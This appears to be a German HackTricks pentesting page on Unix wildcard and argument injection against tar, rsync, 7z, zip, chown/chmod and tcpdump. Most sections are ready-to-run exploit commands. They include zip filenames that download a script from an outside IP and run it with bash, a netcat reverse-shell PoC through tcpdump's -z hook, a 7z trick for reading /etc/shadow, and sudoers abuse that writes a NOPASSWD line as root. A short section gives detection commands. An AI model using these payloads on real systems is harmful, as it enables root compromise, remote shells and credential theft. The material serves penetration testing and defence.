# Wildcards: Weitere Tricks

{{#include ../../banners/hacktricks-training.md}}

> **Argument injection** durch Wildcards (auch *glob* genannt) tritt auf, wenn ein privilegiertes Script ein Unix-Binary wie `tar`, `chown`, `rsync`, `zip`, `7z`, … mit einer nicht in Anführungszeichen gesetzten Wildcard wie `*` ausführt.
> Da die Shell die Wildcard **vor** der Ausführung des Binaries erweitert, kann ein Angreifer, der Dateien im Arbeitsverzeichnis erstellen kann, Dateinamen konstruieren, die mit `-` beginnen, sodass sie als **Optionen statt als Daten** interpretiert werden und dadurch effektiv beliebige Flags oder sogar Befehle eingeschleust werden können.<sup>[[6]](#references)</sup>
> Diese Seite sammelt die nützlichsten Primitives, aktuelle Forschungsergebnisse und moderne Erkennungsverfahren für 2023–2025.

## chown / chmod

Durch den Missbrauch des `--reference`-Flags kann man **den Besitzer/die Gruppe oder die Berechtigungsbits von einer Referenzdatei übernehmen**, wenn ein wie eine Option aussehender Dateiname durch eine Wildcard erweitert wird.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Wenn root später etwas wie Folgendes ausführt:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Der erweiterte `--reference=.drf.php` überschreibt den explizit angegebenen Besitzer/Modus, sodass passende Dateien die Metadaten von `.drf.php` übernehmen (und sie mit dem obigen Setup für den Angreifer beschreibbar werden).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinierter Angriff).<sup>[[7]](#references)</sup>
Siehe auch das klassische DefenseCode-Paper für weitere Details.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Führe beliebige Befehle aus, indem du die **checkpoint**-Funktion von GNU tar und checkpoint actions missbrauchst.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Sobald root beispielsweise `tar -czf /root/backup.tgz *` ausführt, wird `shell.sh` als root ausgeführt.<sup>[[10]](#references)</sup>

### Hinweis zur Überschreibung des bsdtar-/macOS-Kompressors

Das standardmäßige `tar` in aktuellen macOS-Versionen (basierend auf `libarchive`) stellt nicht die `--checkpoint`-Schnittstelle von GNU tar bereit, aber bsdtar dokumentiert **--use-compress-program** zur Auswahl eines externen Kompressors.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Wenn ein privilegiertes Skript `tar -cf backup.tar *` ausführt, wird dadurch `sh` über den `PATH` des Opfers ausgewählt und bsdtar startet es als Kompressor.<sup>[[11]](#references)</sup> Dies belegt eine option injection, ist jedoch für sich genommen keine zuverlässige primitive für beliebige Befehle: Ein durch einen Wildcard erzeugter Dateiname kann kein `/` enthalten, und bsdtar übergibt Archivdaten statt eines vom Angreifer ausgewählten Shell-Befehls. Die Codeausführung erfordert zusätzlich eine kontrollierbare ausführbare Datei, die über den `PATH` oder einen anderen Argumentkanal aufgelöst werden kann und ein nützliches Programm bezeichnet.

---

## rsync

Mit `rsync` kann die Remote-Shell oder die Remote-Binary über Command-Line-Flags wie `-e` und `--rsync-path` überschrieben werden.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Wenn root das Verzeichnis später mit `rsync -az * backup:/srv/` archiviert, kann das injizierte Flag über den Remote-Shell-Mechanismus eine Shell ausführen.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Selbst wenn das privilegierte Skript die Wildcard *vorsorglich* mit `--` voranstellt (um die Optionsverarbeitung zu verhindern), akzeptiert die 7-Zip-CLI **file list files**, indem dem Dateinamen `@` vorangestellt wird. In Kombination mit einem Symlink lassen sich damit *beliebige Dateien exfiltrieren*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Wenn root etwas wie Folgendes ausführt:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip wird versuchen, `root.txt` (→ `/etc/shadow`) als Dateiliste zu lesen, und abbrechen, wobei **der Inhalt nach stderr ausgegeben wird**.<sup>[[13]](#references)</sup>

Dies funktioniert weiterhin mit `-- *`, da die 7-Zip-CLI sowohl reguläre Dateinamen als auch `@listfiles` als positionale Eingaben ausdrücklich akzeptiert und ein literaler Dateiname wie `@root.txt` daher weiterhin speziell behandelt wird.<sup>[[13]](#references)</sup>

---

## zip

Es gibt zwei sehr praktische Primitives, wenn eine Anwendung benutzerkontrollierte Dateinamen an `zip` übergibt (entweder über einen Wildcard oder durch das Aufzählen von Namen ohne `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` aktiviert „test archive“ und `-TT <cmd>` ersetzt den Tester durch ein beliebiges Programm (Langform: `--unzip-command <cmd>`). Wenn du Dateinamen einschleusen kannst, die mit `-` beginnen, teile die Flags auf mehrere unterschiedliche Dateinamen auf, damit das Parsen der Short-Options funktioniert.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Hinweise
- Versuche NICHT, einen einzelnen Dateinamen wie `'-T -TT <cmd>'` zu verwenden — kurze Optionen werden zeichenweise analysiert, und dies wird fehlschlagen. Verwende separate Tokens wie gezeigt.<sup>[[3]](#references)</sup>
- Wenn Schrägstriche von der Anwendung aus Dateinamen entfernt werden, rufe einen reinen Host/IP (Standardpfad `/index.html`) ab und speichere die Datei lokal mit `-O`; führe sie anschließend aus.<sup>[[3]](#references)</sup>
- Du kannst das Parsing mit `-sc` (verarbeitete argv anzeigen) oder `-h2` (mehr Hilfe) debuggen, um zu verstehen, wie deine Tokens verarbeitet werden.<sup>[[3]](#references)</sup>

Beispiel (lokales Verhalten unter zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Datenexfiltration/leak: Wenn die Webschicht die `zip`-Ausgabe auf stdout/stderr zurückgibt (häufig bei naiven Wrappern), werden injizierte Flags wie `--help` oder durch ungültige Optionen verursachte Fehler in der HTTP-Antwort sichtbar. Dadurch lassen sich Command-Line-Injection bestätigen und Payloads besser abstimmen.<sup>[[3]](#references)</sup>

---

## Weitere Kandidaten für Option-Injection

Wenn ein privilegierter Wrapper ein beschreibbares Verzeichnis mit einem Wildcard erweitert, sollten diese dokumentierten Option-Hooks überprüft werden.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Zu missbrauchendes Flag | Wirkung |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Übergibt einen Befehlsstring an eine Shell |
| `git`   | `-c core.sshCommand=<cmd>` | Verwendet `<cmd>` anstelle von SSH für Git fetch/push |
| `scp`   | `-S <program>` | Verwendet ein alternatives SSH-kompatibles Verbindungsprogramm |

Diese Primitives sind über die bekannten *tar/rsync/zip*-Klassiker hinaus nützliche Prüfungen.

---

## Aufspüren verwundbarer Wrapper und Jobs

Aktuelle Fallstudien und Anleitungen zur Erkennung zeigen, dass Wildcard/argv injection nicht mehr nur ein **cron + tar**-Problem ist.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Dieselbe Fehlerklasse tritt weiterhin auf bei:

- Webfunktionen, die „alles als zip/tar herunterladen“ aus von Angreifern kontrollierten Upload-Verzeichnissen
- Debug-Shells von Anbietern/Appliances, die einen **tcpdump**-Wrapper mit von Angreifern kontrollierten Dateinamen-/Filterfeldern bereitstellen
- Backup- oder Rotationsjobs, die `tar`, `rsync`, `7z`, `zip`, `chown` oder `chmod` auf beschreibbaren Verzeichnissen ausführen

Nützliche Triage-Befehle (der `pspy`-Aufruf verwendet die dokumentierten Flags für Prozess-/Dateiereignisse und das Intervall).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Schnelle Heuristiken:

- `-- *` ist eine gute Lösung für viele GNU-Tools, aber **nicht** für `7z`/`7za`, da `@listfiles` separat geparst werden.<sup>[[13]](#references)</sup>
- Suche bei `zip` nach Wrappers, die vom Benutzer kontrollierte Dateinamen direkt aufzählen; das Aufteilen von Kurzoptionen (`-T` + `-TT <cmd>`) funktioniert auch ohne einen Shell-Glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Achte bei `tcpdump` besonders auf Wrappers, mit denen du **Namen von Ausgabedateien**, **Rotationseinstellungen** oder Argumente für die **Wiederverwendung von Capture-Dateien** kontrollieren kannst.<sup>[[18]](#references)</sup>

---

## tcpdump-Rotations-Hooks (-G/-W/-z): RCE durch argv-Injection in Wrappers

Wenn eine eingeschränkte Shell oder ein Vendor-Wrapper eine `tcpdump`-Befehlszeile durch das Aneinanderhängen von benutzerkontrollierten Feldern (z. B. einem Parameter für den „Dateinamen“) ohne strikte Quoting-/Validierungsmaßnahmen erstellt, kannst du zusätzliche `tcpdump`-Flags einschleusen. Die Kombination aus `-G` (zeitbasierte Rotation), `-W` (Begrenzung der Dateianzahl) und `-z <cmd>` (Befehl nach der Rotation) ermöglicht beliebige command execution als der Benutzer, der tcpdump ausführt (auf Appliances oft root).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Voraussetzungen:

- Du kannst `argv` beeinflussen, das an `tcpdump` übergeben wird (z. B. über einen Wrapper wie `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Der Wrapper bereinigt keine Leerzeichen oder Tokens, die im Feld für den Dateinamen mit `-` beginnen.<sup>[[4]](#references)</sup>

Klassischer PoC (führt ein Reverse-Shell-Skript aus einem beschreibbaren Pfad aus).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1` rotiert jede Sekunde, und `-W 1` stoppt nach einer rotierten Datei; der Mitschnitt muss vor der Rotation ein passendes Paket empfangen.<sup>[[18]](#references)</sup>
- `-z <cmd>` führt den Post-Rotate-Befehl einmal pro Rotation aus und übergibt den Pfad der geschlossenen Savefile als Argument; stelle sicher, dass die Argumentverarbeitung des Scripts/Interpreters zu deinem Payload passt.<sup>[[18]](#references)</sup>

Varianten ohne Wechseldatenträger:

- Wenn du über ein anderes Primitive zum Schreiben von Dateien verfügst (z. B. einen separaten Command-Wrapper, der Ausgabenumleitung erlaubt), lege dein Script in einem bekannten Pfad ab und triggere `-z /path/script.sh`; lasse das Script bei Bedarf selbst `/bin/sh` aufrufen.<sup>[[18]](#references)</sup>
- Wenn ein Vendor-Wrapper die Auswahl des rotierten Pfads ermöglicht, prüfe diese Pfadkontrolle nur in Kombination mit einem Post-Rotate-Befehl, der sein Savefile-Argument interpretiert; die Pfadkontrolle allein führt keinen Dateiinhalt aus.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump mit Wildcards/zusätzlichen Argumenten → beliebiges Schreiben/Lesen und root

Beispiel für ein fehlerhaftes sudoers-Muster:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Die Regel lässt mehrere Optionen im dokumentierten Parser von `tcpdump` zu:<sup>[[3]](#references)[[18]](#references)</sup>
- Das `*`-Glob und freizügige Muster beschränken nur das erste `-w`-Argument. `tcpdump` akzeptiert mehrere `-w`-Optionen; die letzte gewinnt.<sup>[[3]](#references)[[18]](#references)</sup>
- Die Regel schränkt andere Optionen nicht ein, daher sind `-Z`, `-r`, `-V` usw. erlaubt.<sup>[[3]](#references)[[18]](#references)</sup>

Die relevanten Primitives sind unten dokumentiert.<sup>[[3]](#references)[[18]](#references)</sup>
- Zielpfad mit einem zweiten `-w` überschreiben (nur das erste erfüllt sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal innerhalb des ersten `-w`, um den eingeschränkten Verzeichnisbaum zu verlassen.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Erzwinge die Eigentümerschaft der Ausgabe mit `-Z root` (erstellt überall Dateien im Besitz von root).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Schreiben beliebiger Inhalte durch das Wiedergeben eines präparierten PCAP über `-r` (z. B. um eine sudoers-Zeile abzulegen).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Erstelle ein PCAP, das die exakte ASCII-Nutzlast enthält, und schreibe es als root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Beliebiges Lesen von Dateien/secret leak mit `-V <file>` (interpretiert eine Liste von savefiles). Fehlermeldungen geben Zeilen oft wieder und leaken dadurch Inhalte.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip-Argument-Injection zu RCE + tcpdump-Sudo-Fehlkonfiguration für Privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Vollständige Exploit-Kette](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potenzielle Shell durch Wildcard-Injection erkannt](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Zurück in die Zukunft: Unix-Wildcards außer Kontrolle (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils-`chown`-Aufruf](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils-`chmod`-Aufruf](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU-tar-Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1)-Handbuch](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1)-Handbuch](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip-Befehlszeilensyntax](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1)-Handbuch](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Dokumentation zur Git-Konfiguration](https://git-scm.com/docs/git-config)
- [17] [OpenBSD-`scp`-Handbuch](https://man.openbsd.org/scp)
- [18] [tcpdump(8)-Handbuch](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
